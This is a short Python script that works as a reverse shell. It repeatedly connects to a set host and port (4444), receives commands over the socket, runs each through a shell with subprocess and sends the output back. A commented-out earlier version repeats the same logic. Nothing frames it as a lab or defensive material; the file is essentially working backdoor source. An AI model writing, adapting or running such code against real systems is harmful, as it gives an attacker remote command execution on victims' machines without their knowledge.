import socket
import subprocess
import time


class Server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        while True:
            time.sleep(20)
            try:
                self.server.connect((self.ip, self.port))
                print("serene self connected")
                self.receive_commands_and_execute()
                break
            except Exception:
                self.connect()

    def receive_commands_and_execute(self):
        while True:
            try:
                receive = self.server.recv(1024).decode()
                result = self.execute_command_on_system(receive)
                self.server.send(result.encode())
            except Exception:
                self.server.send("We encountered an error.".encode())

    def execute_command_on_system(self, command):
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        result = result.decode()
        return result


server = Server('0.0.0.0', 4444)
server.connect()
# def execute_command(command):
#     return subprocess.check_output(command, shell=True)
#
#
# def receive_commands(target):
#     while True:
#         try:
#             receive = target.recv(1024).decode()
#             execute = subprocess.Popen(receive, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
#                                        stdin=subprocess.PIPE)
#             result = execute.stdout.read() + execute.stderr.read()
#             result = result.decode()
#             target.send(f"{result}".encode())
#         except Exception:
#             print("perror")
#             target.send("We encountered an error.")
#
#
# def connection():
#     while True:
#         time.sleep(20)
#         try:
#             server.connect(('0.0.0.0', 4444))
#             print("connected")
#             break
#         except Exception:
#             connection()
#
#
# server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connection()
#
# receive_commands(server)
# # close the connection
# server.close()
